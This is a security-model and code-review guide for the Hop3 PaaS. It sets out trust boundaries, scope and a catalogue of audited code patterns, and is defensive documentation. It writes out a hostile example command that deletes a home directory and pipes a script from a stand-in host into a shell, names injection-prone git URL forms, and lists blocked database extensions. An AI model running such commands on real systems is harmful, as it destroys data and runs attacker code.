# Security model and review guide

**Status:** Living document: last updated 2026-08-01.

**Audience:** Hop3 contributors, code reviewers, internal and external security auditors, and LLM-based review tooling. Read this before filing a security finding against the codebase, and before *running* a review; §4 is the procedure. Most "this looks like an injection / a leak" patterns in this repo are deliberate and have already been audited; §3 tells you which.

This doc is the **engineering source**. Three published documents derive from it, each with a different audience:

| Document | Audience |
|---|---|
| [`docs/src/guides/security.md`](../../docs/src/guides/security.md) | Operators: what the platform protects, what stays theirs, what to check before going live |
| [`docs/src/developers/security-model.md`](../../docs/src/developers/security-model.md) | Developers and auditors: trust boundaries, review method, filing findings |
| [`docs/src/reference/policies/security-policy.md`](../../docs/src/reference/policies/security-policy.md) | Anyone reporting a vulnerability: disclosure channel (**security@abilian.com**), acknowledgement commitment, safe-harbour terms |

The published pages carry the model and the method. **§3 below, the site-by-site catalogue of reviewed-and-deliberate constructions, is deliberately not duplicated there**, so keep it here and link to it. When a boundary moves, update this file and the two derived pages in the same change.

It is also not a record of any particular review: each review round gets its own `report-YYYY-MM-DD.md` in this directory:

| Report | Round | Outcome |
|---|---|---|
| [report-2026-05.md](report-2026-05.md) | Five iterative LLM review rounds, 0.5 release series | 4 critical/high pre-auth findings, ~30 further fixes |
| [report-2026-07-21.md](report-2026-07-21.md) | Automated audit (letscode / vulnhunt) | 1 systemic authorization gap, 5 injection fixes, 4 open items |
| [report-2026-07-29.md](report-2026-07-29.md) | Threat-model-driven audit (bruce) | Pre-auth brute-force and user enumeration on the RPC login path; 4 candidates refuted |
| [rootd-hardening.md](rootd-hardening.md) | rootd systemd sandboxing debt | Open: relocation (a live escalation) + sandbox redesign |

**[backlog-2026-08-01.md](backlog-2026-08-01.md) is the current backlog**: what is left across all rounds, verified against the tree, with the decisions that are outstanding. Start there rather than diffing three reports.

**Keep the reports current.** When a finding is fixed, say so in the report that raised it, in the same change: what was done, and what the fix turned out to involve. A report is the record of a finding's whole life, not a snapshot of the day it was written, and it is what the next reviewer reads to decide whether a surface is worth re-examining. A stale "open" is how the same defect gets re-found and re-triaged from scratch. See §4.8.

For the umbrella ADR pointing to per-concern decisions (encryption-at-rest, MFA, supply chain, …), see [ADR 010](../adrs/010-security-and-resilience.md).

---

## 1. Trust model

Hop3 is a single-host PaaS. Five distinct actors, with clear privilege boundaries between them. Every audit decision below ultimately reduces to "across which boundary does this taint flow?". When the answer is "none" the finding is misaligned with the model regardless of how risky the surface code looks.

### 1.1 Actors

| Actor | What it is | Trust posture | Threat surface |
|-------|-----------|---------------|----------------|
| **Operator** | The sysadmin who installed Hop3 (root on the host, runs `hop3-install server`). | **Fully trusted** within the host. Can edit any config, read any file, restart any service. | Operator-level compromise = host compromise. Out of scope. |
| **App deployer** | A user who has been granted a hop3 admin token and pushes apps via the CLI / RPC. Authenticated. | **Trusted within the app runtime.** Can write the app's `hop3.toml`, choose its entrypoint, set its env, install allow-listed addon services. Cannot escalate to operator. On the control plane an account is operator-equivalent and reaches every app; §1.4. | Privilege boundary: app deployer → operator/host. The non-trivial security work in the codebase. |
| **hop3-server (daemon)** | The ASGI server, runs as user `hop3`. | Confidant of operator + app deployer; not internet-trusted. Receives RPC, drives uWSGI, writes addon secrets. | Anything reachable on `0.0.0.0:8000` (`/auth/login`, `/rpc`, `/api/stream/...`) is the public attack surface. |
| **hop3-cli / hop3-tui (workstation tools)** | The CLI binary and the Textual TUI, both running on a developer's laptop and talking to a hop3-server over HTTPS or an SSH tunnel. The TUI shares the CLI's posture entirely: it reads the same auth-token file, hits the same RPC endpoint, and is hardened the same way (atomic-write + 0600, SSL config options, see §3.4 / §3.6). | Trusted by the user invoking it. The user owns the shell. | Threats: a hostile remote server replying to the RPC; a malicious `hop3.toml` in a cloned repo; on-disk perms of the auth-token file. |
| **hop3-rootd (kernel-boundary daemon)** | A small root-owned daemon listening on a Unix socket; performs the operations `hop3-server` cannot do as the unprivileged `hop3` user (firewall changes, nginx reload, …). | Only ever invoked by `hop3` user or `root`, authenticated by `SO_PEERCRED` UID check on the local socket. | Confused-deputy risk if any operation accepts caller-controlled paths/identifiers without revalidation. |

### 1.2 The boundaries that matter

The code paths exercised by every Hop3 deploy cross at most three privilege boundaries:

1. **Unauthenticated HTTP → authenticated session.** Login handlers, magic-link consumption, JWT validation, rate limiter. Anything before the bearer-token check is internet-exposed.
2. **App deployer → host.** The deployer writes `hop3.toml` and pushes a tarball; Hop3 turns that into a uWSGI vassal, an nginx config, an addon-secrets file. Sinks that interpolate deployer-controlled strings into shell, SQL, configuration files, or filesystem paths are the place to look.
3. **hop3 user → root (rootd).** The hop3 server hands a JSON-RPC request to rootd over a local socket; rootd executes a privileged op. Per-op validators run inside rootd; the socket path itself is mode 0660 with `SO_PEERCRED` UID gating.

Most "command injection" / "shell construction" findings turn out **not** to cross any of these. See §3.2.

There is deliberately **no fourth boundary between two app deployers** on the control plane: the control plane is single-tenant, and an account is operator-equivalent. See §1.4; this is scheduled to change, and §1.2 grows a fourth boundary when it does.

### 1.3 Scope

**In scope:**

- Crossing the unauthenticated-HTTP boundary without authentication.
- Escaping from "deploy an app" to "execute as operator", "execute as the postgres superuser", or "modify state outside the per-app namespace".
- Token / password / private-key leakage at boundaries: argv, logs, error messages, API responses, on-disk files readable by other local users.
- Replay / fixation of auth tokens, session secrets, magic-link tokens.
- Denial of service that bricks the server or starves an unrelated tenant.
- Supply-chain integrity of pinned dependencies and shipped binaries.

**Out of scope:**

- **Post-host-compromise scenarios.** "An attacker who is already root could…", "if `/etc/hop3/secrets` were read by an attacker…". Operator compromise is not modelled; it precedes anything we could defend against on this layer.
- **Self-injection on the developer workstation.** "The CLI user could craft a `hop3.toml` that runs commands on their own machine when they cd into it." The user owns their shell.
- **Key-custody hardening beyond the environment.** Addon credentials *are* encrypted at rest (§3.4.5), but the key is `HOP3_SECRET_KEY` in the server's environment. HSM, TPM and cloud-KMS custody are explicitly not provided; operators who need them integrate at the OS level (sealed systemd credentials, TPM-backed keyrings). Automated key rotation is likewise out of scope: rotation is the documented manual procedure. See [ADR 011](../adrs/011-encryption.md).
- **Database-file encryption.** Row-level encryption protects secrets inside the row, including from an operator with raw read access. Confidentiality of the database *file* is the operator's job (filesystem ACLs, full-disk encryption).
- **Multi-node tenancy isolation.** Hop3 is single-host. Apps are isolated at runtime by Unix users + uWSGI vassals + nginx routing, not by VMs or containers. Tenants who don't trust each other should run on separate hosts.
- **Control-plane separation between two accounts.** Out of scope for 0.7 by decision, not by accident: an account is operator-equivalent (§1.4). Per-resource ownership is planned work; when it lands this bullet moves to "in scope".
- **Control-plane audit log.** `hop3-rootd` audits every privileged operation ([ADR 041](../adrs/041-privileged-operations-agent.md)); the RPC layer has no equivalent record of security-relevant events (logins, token issuance and revocation, app and addon mutation). Known gap, out of scope for 0.7.
- **Compliance certifications** (GDPR, ISO 27001, …). Hop3 ships primitives; operators certify deployments.
- **Strong-MFA, hardware-token enrolment, WebAuthn.** Designed in [ADR 012](../adrs/012-mfa.md), deferred and not implemented. The intended deployment pattern (CLI → SSH tunnel → RPC) gives operators an SSH-key second factor in practice; MFA would harden the password-login path on top of that.

### 1.4 The control plane is single-tenant

§1.1 says an app deployer is trusted "within their own app's namespace". Read that as a statement about the *runtime*: Unix users, uWSGI vassals, cgroup limits, nginx routing. On the **control plane** there is no such confinement, and this is the current design:

> **A Hop3 account is an operator-equivalent credential.** Any authenticated user can act on any app and any addon on the host. Provision accounts accordingly.

What the code does: `App` carries no owner column, `AddonCredential` binds to an app but never to a user, and `Command.pass_username` defaults to `False`. Of 190 registered command classes, 18 receive the caller's identity and 16 apply an admin check, all in the user-management and email surfaces. Every app- and addon-scoped command is therefore structurally unable to make an authorization decision. The RPC dispatcher authenticates the caller and checks scope; it does not check ownership, because there is nothing to check against. The dashboard shares the posture: `dashboard/addons.py` lists every addon on the server to any authenticated session.

**Single-tenant is not the same claim as single-host.** They are independent properties; arguments made about one get misread as settling the other. Several tenants can share one server; one tenant can span several servers. Hop3 today is single-host *and* single-tenant, but only the first is architectural. The second is a gap in the control plane that nobody decided on the merits. [ADR 011](../adrs/011-encryption.md) derives one encryption key per deployment, which follows from single-tenancy rather than establishing it.

**Direction of travel.** Per-resource ownership (an owner on `App`, an authorization step in the RPC dispatcher) is planned work. It is out of scope for 0.7. Multi-tenancy on one host comes first; multi-server is the step after, and a later project. The code evidence and the proposed shape of the fix are in [report-2026-07-21.md](report-2026-07-21.md) §1. When it lands, §1.1, §1.2, §1.3 and this section change together, and a fourth boundary (app deployer A → app deployer B) joins §1.2 as an enforced one.

`docs/src/developers/architecture.md` lists "a multi-tenant, SaaS-compatible solution" among the needs Hop3 addresses for MSPs. It is an accurate statement of direction. It does not describe what the control plane enforces today, which is why the operator-facing [Security](../../docs/src/guides/security.md) page states the account model in plain terms.

Consequences for reviewers, until then:

- A finding of the form "user X can reach user Y's app" describes the current model. File it against the ownership work instead.
- A finding that an *unauthenticated* caller reaches an app-scoped command **is** a vulnerability, and a serious one.
- Anything that leaks one account's credentials to another account is still in scope: operator-equivalence is a statement about authorization, not a licence to leak secrets across the RPC boundary.

---

## 2. Conventions and process

### 2.1 Comment conventions in source

We use two distinct prefixes, both grep-able:

- **`# SECURITY:`**: *this code is a security control*. Removing or weakening it changes the security posture. The comment names the threat being mitigated and any upstream contract the control relies on. Examples: input validators before SQL identifier interpolation, `MODE=production` interlocks, password-via-stdin instead of argv.

- **`# AUDIT:`**: *this code looks suspicious; it has been reviewed; here is why it is fine*. The comment names the trust-boundary argument that makes the surface safe. Use when a reviewer (human or LLM) would otherwise re-flag the construction.

Both forms should reference §X of this document for the boundary argument when one applies. To list every audited site:

```sh
git grep -n -E "^[ \t]*# (SECURITY|AUDIT):" -- packages/
```

Top-of-file *Trust model* docstrings are also acceptable for whole-module reasoning (see `packages/hop3-cli/src/hop3_cli/commands/local/ssh_ops.py`, `packages/hop3-installer/src/hop3_installer/deployer/backends/docker.py`).

### 2.2 Sister-site discipline

A hardening pattern that lives in one module is almost certainly relevant in others. We have repeatedly shipped a fix in one place only to find the matching site in another module still using the original anti-pattern. Examples we have actually hit:

- **`MYSQL_PWD` env vs `-p{password}` argv.** First applied in the server-side mysql addon plugin; installer-side connection-verify helpers had the same shape and were caught only on a later pass.
- **Atomic write + `chmod 0o600` on the auth-token config.** First applied in `hop3-cli`; the equivalent logic in `hop3-tui` had to be applied separately.
- **`validate_hostname_list` before HOST_NAME interpolation.** Applied in the nginx proxy plugin from the start; the Caddy and Traefik plugins shipped without it for a release.

**Rule.** When you fix a hardening pattern in one place, run a `git grep` for the original anti-pattern across all packages before declaring the fix done. Use a search shape that targets the *anti-pattern* (e.g. `git grep -n 'f"-p{'` for argv-style passwords, `git grep -n 'write_text' -- 'packages/**/config*.py'` for non-atomic config writes). Add the matches to the same fix or to a follow-up task; either way they should not survive the round.

This is process, not a security control; it visibly reduces the round-over-round drift between "fix landed" and "fix is pervasive".

---

## 3. Audited patterns

The constructions in this section have been deliberately reviewed. Each entry: the pattern, where it lives, why it is safe, and which boundary protects it. If you find code matching one of these patterns and your finding is "this looks like X", check here first.

### 3.1 Identifier interpolation into SQL / argv

#### 3.1.1 MySQL: `db_name` in `CREATE DATABASE` / `GRANT`

**File:** `packages/hop3-server/src/hop3/plugins/mysql/mysql.py`
**Pattern:** `f"CREATE DATABASE \`{self.db_name}\`"` and similar GRANT statements use direct string interpolation, *not* parameter binding (which the MySQL wire protocol does not support for identifiers anyway).

**Why safe:**

1. `addon_name` is validated by `validate_service_name()` in `packages/hop3-server/src/hop3/core/identifiers.py` before `MySQLAddon` is constructed. The validator enforces `^[a-z][a-z0-9-]*$`, capped length, no shell metacharacters.
2. `MySQLAddon.__post_init__` re-runs the validator as defense in depth, so a future code path that constructs `MySQLAddon` directly from an unvalidated source still fails closed.
3. `db_name` is then derived from `addon_name` by replacing `-` → `_`. Both characters are in the validator's allow-list and neither breaks an identifier.

**Boundary:** *App deployer → host.* The validator is the enforcing control. If you are about to file "SQL injection in mysql.py", check that `validate_service_name` is still called both in `AddonCreateCmd.call` (`commands/services.py`) and in `__post_init__`.

#### 3.1.2 MySQL admin: `mysql_password` in `CREATE/ALTER USER`

**File:** `packages/hop3-installer/src/hop3_installer/server_installer/mysql.py`
**Pattern:** `_create_mysql_hop3_user` interpolates `mysql_password` directly into a SQL string fed to `mysql -e`.

**Why safe:** the password is generated by `secrets.token_hex(...)` and is hex-charset by construction. `_validate_mysql_password` is the canonical gate, called at the top of `_create_mysql_hop3_user`. The two-step contract (generation + re-validation at sink) is the enforcing control; the SQL interpolation is only safe because the contract holds.

**Boundary:** *Operator → host.* The installer runs as root; this code never sees app-deployer input. A future regression in either the generator or the validator would make it unsafe; that's why both halves are pinned together with explicit comments at both call sites.

#### 3.1.3 PostgreSQL: extension names in `CREATE EXTENSION`

**File:** `packages/hop3-server/src/hop3/plugins/postgresql/postgres.py`
**Pattern:** `cursor.execute(sql.SQL("CREATE EXTENSION IF NOT EXISTS {}").format(sql.Identifier(ext)))`.

**Why safe:**

1. `psycopg2.sql.Identifier` neutralises SQL injection in the name itself.
2. An additional **allow-list** (`DEFAULT_ALLOWED_EXTENSIONS` plus operator-extensible `HOP3_EXTRA_PG_EXTENSIONS`) refuses anything not on the list, with a hard-deny `BLOCKED_EXTENSIONS` set (`adminpack`, `dblink`, `file_fdw`, `postgres_fdw`, `pl{perl,python,tcl}u`) that even the operator override cannot lift.

The allow-list exists because some PostgreSQL contrib extensions grant filesystem / network / arbitrary-code-execution capability to whoever can call them, regardless of whether they were installed safely. See [`docs/src/guides/addons.md`](../../docs/src/guides/addons.md) for the user-facing description.

**Boundary:** *App deployer → operator/host.* Both controls (Identifier quoting and allow-list) are required.

#### 3.1.4 Redis: db number selection

**File:** `packages/hop3-server/src/hop3/plugins/redis/redis.py`
**Pattern:** `redis-cli -n {db_number}` with `db_number` derived from the addon name.

**Why safe:** `db_number` is allocated sequentially out of `[1, 15]` from the addon-secrets store and stored back persistently. It is never derived from `hash(addon_name)` (which was the original buggy form: non-deterministic across processes, only 16 buckets, trivial to collide).

The claim is written **under an exclusive `flock` on the secrets directory, in the same critical section that chose the number**. Until 2026-08-09 this paragraph claimed more than the code delivered: allocation scanned the directory and returned a number, and the caller saved it only after pinging Redis, making it writable and setting a marker key. Two `addon create` calls passing through that window were handed the same database and shared each other's keys, with nothing to notice — a test that starts ten claims at once gets ten copies of db 1 against the old code. The lock is filesystem-level rather than a `threading.Lock` because a CLI-side addon command and the server are separate processes over one directory.

A create that fails after claiming releases the number (`_release_db_number`), because a slot held by an addon that does not exist is one of fifteen lost until someone reads the directory by hand. When the fifteen really are taken, the refusal names which addon holds each one.

**Boundary:** *App deployer → app deployer.* Two apps colliding on the same Redis db number would mix their data; atomic claim + persistent assignment precludes that.

#### 3.1.5 `git clone`: the repository URL in argv, and the cost of fetching it

**File:** `packages/hop3-server/src/hop3/core/git.py` (`clone_repository`), called from `commands/app.py` (`hop3 app create <repo_url>`)
**Pattern:** an operator-supplied URL becomes an argument to `git clone`, and git then fetches whatever is on the other end.

**Why safe:**

1. `validate_repo_url()` in `core/identifiers.py` refuses anything that is not `https://`, `http://`, `ssh://`, `git://` or the scp form `git@host:user/repo.git`. This is an allow-list because a URL is not an inert string to git: `ext::sh -c …` runs its argument, `file:///…` reads any path the hop3 user can read, and a value starting with `-` is an option rather than an address (`--upload-pack=…` names a command to run). Whitespace and control characters are refused with them.
2. The argv is `git clone … -- <url> <dest>`, so even a value that reached this point unvalidated cannot be read as an option.
3. The clone runs under a wall-clock timeout and a byte cap (`CLONE_TIMEOUT_SECONDS`, `CLONE_MAX_BYTES`), shallow and single-branch, in its own process session so that killing it kills the transport helpers it spawned. A clone that fails, times out or overruns has its partial tree removed: a cap that leaves the bytes it refused on the disk has capped nothing.

**Boundary:** *App deployer → host.* Item 1 is the injection control; item 3 is the availability one, and it is the reason this is written down. Cloning is the one deploy step whose cost is chosen entirely by whoever supplies the URL, and the disk it fills is shared by every app on the host — the "apps must coexist without interference" rule, enforced rather than assumed. See [report-2026-07-21.md](report-2026-07-21.md) §7.

### 3.2 Shell construction in subprocess

#### 3.2.1 uWSGI worker: `command` and env exports

**File:** `packages/hop3-server/src/hop3/run/uwsgi/worker.py` (`WebWorker.update_settings`, `GenericWorker.update_settings`)
**Pattern:** the deployed app's `command` (from Procfile or `hop3.toml`) is wrapped in a shell line that exports `env` first, then `cd`s into `src/`, then exec's the command. Env values are escaped against the surrounding `'...'` quoting.

**Why safe:** **there is no privilege boundary here.** The app's deployer authored the command; the app's deployer authored the env values. The shell that runs them runs *as* the app deployer's app, with its own user, its own filesystem layout, and full code-execution rights inside that runtime. The single-quote escaping of env values is for *correctness* (an env value that legitimately contains `'` shouldn't break the export line), not for security.

**Boundary:** *None.* The deployer can already run arbitrary code in their app's runtime by writing `command = "rm -rf $HOME && curl evil.com | sh"` in their `hop3.toml`. That is the contract. The shell construction in `worker.py` does not alter that contract.

If you are about to file "shell injection via env / command in uWSGI worker", read the trust-model docstring at `WebWorker.update_settings` first.

**Corollary (recurring confusion):** env-var *values* are not validated and do not need to be. They are app-deployer-owned by the same logic as `command`. A reviewer who flags "no shell-metacharacter check on env values" is asking us to validate input that is *intentionally* arbitrary: the deployer's app reads its own env values, and the shell construction doesn't escalate. The same reasoning applies to env-var values flowing into Docker compose templates, proxy templates, etc.: they are app-owned values being threaded back to app-owned consumers.

#### 3.2.2 CLI ssh_ops: `username`, `email`, `ssh_target`, …

**File:** `packages/hop3-cli/src/hop3_cli/commands/local/ssh_ops.py` (top-of-file *Trust model* note)
**Pattern:** the CLI builds shell strings that flow into `ssh user@host "..."` and `subprocess.run([...])` invocations. All inputs are passed through `shlex.quote` first.

**Why safe:** every input flowing into these strings (`username`, `email`, `ssh_target`, `hostname`, `server_url`) originates from the local user invoking the CLI on their own workstation. The user owns their own shell; "command injection" here is self-injection. `shlex.quote` use is for correctness with the SSH-via-shell idiom, not as a privilege boundary.

**Boundary:** *None.* (`hop3-cli` is local; the user → user direction is not modelled.)

#### 3.2.3 Installer LocalRunner: static-literal commands

**File:** `packages/hop3-installer/src/hop3_installer/validators.py` (`LocalRunner` class docstring)
**Pattern:** `LocalRunner.__call__` runs every `command` argument through `subprocess.run([...], shell=True)`-equivalent.

**Why safe:** every `command` argument is a static literal defined in this same module (e.g. `"systemctl is-active nginx"`, `"test -d /home/hop3/venv"`). No user-controlled string flows in. The runner is "trusted-input only" by design.

**Boundary:** *None.* If a future call site ever feeds a non-literal into `LocalRunner.__call__`, the trust-model assumption breaks; the docstring spells this out.

#### 3.2.4 Deployer admin-user creation: password via stdin

**File:** `packages/hop3-installer/src/hop3_installer/deployer/deploy.py`
**Pattern:** the deploy backend calls `subprocess.run(..., input=password)` so the admin password reaches the remote `hop3-server admin:create --password-stdin` over stdin instead of through the shell as `echo {pw} | …`.

**Why safe:** the password never appears in argv. `/proc/<pid>/cmdline` is therefore safe for the duration of the deploy. This is the security control; the `# SECURITY:` comment at the call site documents the reasoning. Earlier versions used the `echo` form, which leaked the password to any local user able to read `/proc`.

**Boundary:** *App deployer → host (during install).* This control matters because `hop3-deploy` runs against a remote server and the admin password can be anything the operator picks.

#### 3.2.5 Installer `run_as_hop3`: argv at the seam, shell by exception

**File:** `packages/hop3-installer/src/hop3_installer/server_installer/user.py`
**Pattern:** `run_as_hop3(argv: list[str])` executes `["su", "-", HOP3_USER, "-c", shlex.join(argv)]`. `su -c` hands its argument to a login shell whether or not the caller wants one, so the quoting happens at the seam, once.

**Why safe:** the seam owns the quoting, so a new call site cannot forget it. The four call sites that genuinely need shell operators (`|`, `&&`, `2>/dev/null`) use an explicit `run_as_hop3_shell`, whose docstring states that the caller owns quoting; shell use is rare and greppable rather than the default. A string passed to `run_as_hop3` is rejected with a `TypeError`: `shlex.join` iterates a string per character, so `run_as_hop3("pip install foo")` would otherwise have produced `p i p ' ' i n s t a l l …`, a mangled command that still runs under callers that mostly pass `check=False`.

**Boundary:** *Operator → host*, so this was never an escalation; the installer already runs as root on input the operator typed. It was fixed anyway because the safety had been **per-site discipline rather than a property of the seam**, which is exactly the shape §2.2 says drifts. See [report-2026-07-21.md](report-2026-07-21.md) §3.

### 3.3 Process / configuration interlocks

#### 3.3.1 `HOP3_UNSAFE`: auth bypass guard

**File:** `packages/hop3-server/src/hop3/core/unsafe_gate.py`
**Pattern:** `enforce_unsafe_mode_policy()` runs at startup (`asgi.py::on_startup`) and:

1. Refuses to honour `HOP3_UNSAFE=true` unless `HOP3_UNSAFE_ACK="yes-I-understand"`.
2. **Forces `HOP3_UNSAFE=false` when `MODE=production` regardless of any other variable**, with a `SECURITY:` log line.

**Why safe:** the production override is the enforcing control. Even an operator who deliberately exports `HOP3_UNSAFE=true HOP3_UNSAFE_ACK=yes-I-understand MODE=production` cannot disable auth in production. The order is enforced because `enforce_unsafe_mode_policy()` runs before any auth-guarded code path.

**Boundary:** *Unauthenticated → authenticated.* This is the single most important interlock; please don't relax it without a separate ADR.

#### 3.3.2 `HOP3_SKIP_CONFIG_VALIDATION`: schema escape hatch

**File:** `packages/hop3-server/src/hop3/project/hop3_config.py` (`_validation_skip_requested`)
**Pattern:** an env-var escape hatch that disables Pydantic validation of `hop3.toml`. Originally honoured unconditionally; now gated behind `MODE != production`.

**Why safe:** in production the schema is the contract; silently accepting malformed configs would mask deploy bugs and could let an attacker-supplied `hop3.toml` exercise underspecified fields. Out of production the escape hatch is useful for back-compat with old configs during testing/migration.

**Boundary:** *App deployer → host.* The bypass would otherwise be a way to feed unparseable shapes into deployer code.

#### 3.3.3 DockerDeployBackend: `MODE=production` refusal

**File:** `packages/hop3-installer/src/hop3_installer/deployer/backends/docker.py` (top-of-file *Trust model* note + `__init__` interlock)
**Pattern:** the backend embeds the literal `E2E_TEST_SECRET_KEY = "e2e-test-secret-key-do-not-use-in-production"` so a developer-launched throwaway container can mint admin tokens predictably. The class refuses to construct itself if `MODE=production` is set in the environment.

**Why safe:** the test secret only ships in this developer-only module, never in `hop3-install server`. The `__init__` interlock + the top-of-file note ensure the path cannot reach a production deploy by accident.

**Boundary:** *Developer convenience → production deploy.* Don't soften the interlock; if a real production-shaped Docker deploy is ever needed, do it by separating the test-secret backend from the production-shaped one, not by relaxing the gate.

#### 3.3.4 Build concurrency: the queue between a deploy and a build

**File:** `packages/hop3-server/src/hop3/deployers/build_queue.py`, used by `commands/_deploy.py`
**Pattern:** every background build goes through one `BuildQueue`. `MAX_CONCURRENT_BUILDS` (default 2) run at a time; `MAX_WAITING_BUILDS` (default 32) may wait; past that a deploy is refused.

**Why safe:** the number of concurrent builds used to be chosen by whoever called the RPC — one thread per deploy, unbounded — so a burst of deploys became a burst of compiles on the box that is also serving every running app. Both bounds are needed: workers cap the work in flight, the wait line caps the memory a burst can hold. The refusal is loud (it finishes the deploy's own stream with the reason, which the CLI reports as a failed deploy), and so is the wait: a queued deploy writes a line saying how many are ahead of it, because a build that has not started looks exactly like a build that has stalled.

**Boundary:** *App deployer → app deployer, and → host.* This is the "apps must coexist without interference" rule enforced for the one resource a deploy consumes most of. Workers are daemon threads by design, so a server restart is not held behind a long build; an interrupted build leaves its app half-deployed, which is the state reconciler's job and not the queue's. See [report-2026-07-21.md](report-2026-07-21.md) §7.

### 3.4 Secret handling (keep secrets off argv and out of logs)

**Rule.** Any subprocess that needs a credential takes it via environment variable or stdin, never via argv. The OS-level argv of a spawned process is visible in `ps`, `/proc/<pid>/cmdline`, and shell history; environment variables and stdin are not. Every audited site below applies this rule one way or another (`MYSQL_PWD`, `PGPASSWORD`, `REDISCLI_AUTH`, `--password-stdin` from the deployer). When you add a new subprocess that handles a secret, pick whichever mechanism the target tool documents and do not invent a fourth way to do it on argv.

> **Note for reviewers (recurring confusion).** "Argv" in this section means the OS-level `argv` of a *spawned process*: what shows up in `ps`, `/proc/<pid>/cmdline`, and shell history. Python list arguments to a function call (e.g. `client.rpc("cli", ["auth", "login", username, password])` or `command.call(..., password, ...)`) are *not* argv. They are stack-allocated function parameters that get JSON-serialised into an HTTPS request body or passed in-process to a method. There is no `/proc` exposure for those flows. If a reviewer flags "password leakage via process arguments" for a Python list passed to a function, the finding is misreading argv: only `subprocess.run([...])`-style invocations and the equivalent place secrets in OS argv. The mitigations below all target that specific case.

#### 3.4.1 mysqldump / mysql client: `MYSQL_PWD`

**File:** `packages/hop3-server/src/hop3/plugins/mysql/mysql.py` (`backup`, `restore`)
**Pattern:** the password reaches `mysqldump` / `mysql` via the `MYSQL_PWD` environment variable, *not* via `-p{password}` on argv.

**Why safe:** `MYSQL_PWD` is read from the spawned process's env (which is per-process and not exposed via `/proc/<pid>/cmdline`). The `-p{password}` form puts the secret in argv where any local user can read it for the duration of the dump.

**Boundary:** *App deployer → other local users on the host.* The MySQL admin password rotates per-addon and is held in the addon-secrets store; argv leakage was the leak vector.

#### 3.4.2 PostgreSQL: `PGPASSWORD`

**File:** `packages/hop3-server/src/hop3/plugins/postgresql/postgres.py` (`backup`, `restore`)
**Pattern:** the postgres plugin uses `PGPASSWORD` env injection for `pg_dump` / `psql` and `psycopg2.connect` for in-process queries. Same shape as the MySQL fix.

**Why safe:** same reasoning as 3.4.1.

#### 3.4.3 Redis: `REDISCLI_AUTH` and persistent password file

**File:** `packages/hop3-installer/src/hop3_installer/server_installer/redis.py` (installer side); `packages/hop3-server/src/hop3/plugins/redis/redis.py` (server side, `_redis_cli_env`).
**Pattern:** the installer generates a Redis password, writes it to `/etc/hop3/redis-pass` (mode 0640, owner `root:hop3`), and writes `requirepass` into `redis.conf`. The server-side addon plugin reads the file at runtime and exposes the password via `REDISCLI_AUTH` env so it never appears in `redis-cli -a SECRET` argv. `REDIS_URL` carries the password URL-quoted (`redis://:secret@host:port/db`).

**Why safe:** the password file is operator-owned; only members of the `hop3` group can read it; argv stays clean. Legacy installs without the file fall back to unauthenticated mode (back-compat), but new installs and any operator who re-runs `hop3-install` get authentication enabled.

**Boundary:** *App deployer / network-adjacent attacker → Redis instance.* Without `requirepass`, `protected-mode no` (which the installer used to set unconditionally for Docker bridge access) leaves Redis open to any host that can reach port 6379.

#### 3.4.4 CLI auth-token storage

**File:** `packages/hop3-cli/src/hop3_cli/config.py` (`Config.save`)
**Pattern:** `~/.config/hop3-cli/config.toml` is written via tempfile + `os.replace` with `chmod 0600` and an `os.fsync` before swap-in.

**Why safe:** other local users cannot read the JWT auth token; a crash mid-write cannot leave the file truncated (which would brick auto-auth).

**Boundary:** *CLI user → other local users on the workstation.*

#### 3.4.5 Addon credentials at rest: versioned Fernet

**File:** `packages/hop3-server/src/hop3/core/credentials.py` (note: *not* `hop3/server/security/`, where older docs place it).
**Pattern:** addon credentials and app admin credentials are stored encrypted in the control-plane database, not as plaintext columns. This is the *attachment* copy; the provisioning-side record on disk is plaintext, and §3.4.7 is the other half of this entry.

**Why safe:** Fernet AEAD (AES-128-CBC + HMAC-SHA256) with a key derived from `HOP3_SECRET_KEY` by PBKDF2-HMAC-SHA256. The scheme is **versioned**, and both halves matter:

- **v2** (current): 600 000 iterations (the OWASP 2026 baseline) with a per-install salt read from `HOP3_CREDENTIAL_SALT`. Tokens are stored with a `v2:` prefix.
- **v1** (legacy): 100 000 iterations with a static salt, stored unprefixed. Still *readable*, so an upgrade doesn't strand existing installs, and `hop3 admin reencrypt-credentials` migrates it forward rather than leaving it silently weak.

Authentication is part of the primitive, so tampering with a stored credential is detected rather than decrypted into something unexpected. A database backup is useless without the key.

**Boundary:** *Database read access → credential plaintext.* This holds against an operator with raw row access, which is the point of encrypting inside the row. It does **not** protect against someone who has both the database and `HOP3_SECRET_KEY`; key custody is §1.3's explicit non-goal.

If you are about to file "credentials stored in plaintext" **about the database**, check `AddonCredential` and `AppAdminCredential` in `orm/`: the columns hold Fernet tokens. About `$HOP3_ROOT/addons/*/*.json`, the finding is correct and §3.4.7 is where it is answered. This sentence used to stop at the first clause, which is how a true finding gets waved off by a document written to describe a different store.

#### 3.4.6 CLI streaming RPC: bounded timeouts

**File:** `packages/hop3-cli/src/hop3_cli/rpc/streaming.py`
**Pattern:** the SSE streaming client uses `timeout=(connect=30s, read=300s)` with explicit `ConnectTimeout` / `ReadTimeout` handlers. Earlier versions used `timeout=None`.

**Why safe:** a slowloris-style hang or a stuck server cannot block a CI runner indefinitely. The 300s read-timeout is well-defined for SSE because the server emits keepalive comments every ~15s; a missed keepalive trips it cleanly.

**Boundary:** *Network → CLI.* DoS surface, not a credential leak.

#### 3.4.7 Addon credentials in flight: the plaintext provisioning store

**File:** `packages/hop3-server/src/hop3/plugins/addons/secrets.py`
**Pattern:** every provisioned addon instance also has a **plaintext** JSON record at `$HOP3_ROOT/addons/<type>/<name>.json`, mode 0600. PostgreSQL and MySQL write the database password there, `email` the operator's upstream SMTP password, `redis` its db number. It is written atomically (`mkstemp` + `os.replace`, 0600 from birth) for the reason §3.4.4 and `server/cli/setup.py` do it: the older open-then-chmod published the password at 0644 for the length of the write, re-opened that window on every rotation, and — because it truncated the live file first — destroyed a working credential when the write failed, leaving an app unable to reach a database that still expected the old password.

**Read this next to §3.4.5, because the two are easy to conflate.** They are separate stores holding the same secret:

| | §3.4.5 `AddonCredential` | §3.4.7 addon secrets file |
|---|---|---|
| What it is | the app *attachment* — what gets injected into an app's env | the *provisioning* record — what the addon actually created |
| Where | control-plane database | `$HOP3_ROOT/addons/<type>/<name>.json` |
| At rest | Fernet, versioned | **plaintext**, 0600 |
| Read back by | env provisioning | the addon plugin, on every connection-details call |

So "addon credentials are encrypted at rest" is true of the database and false of the filesystem, and the filesystem copy is the authoritative one. Do not read the encrypted column as meaning the credential exists in only one place.

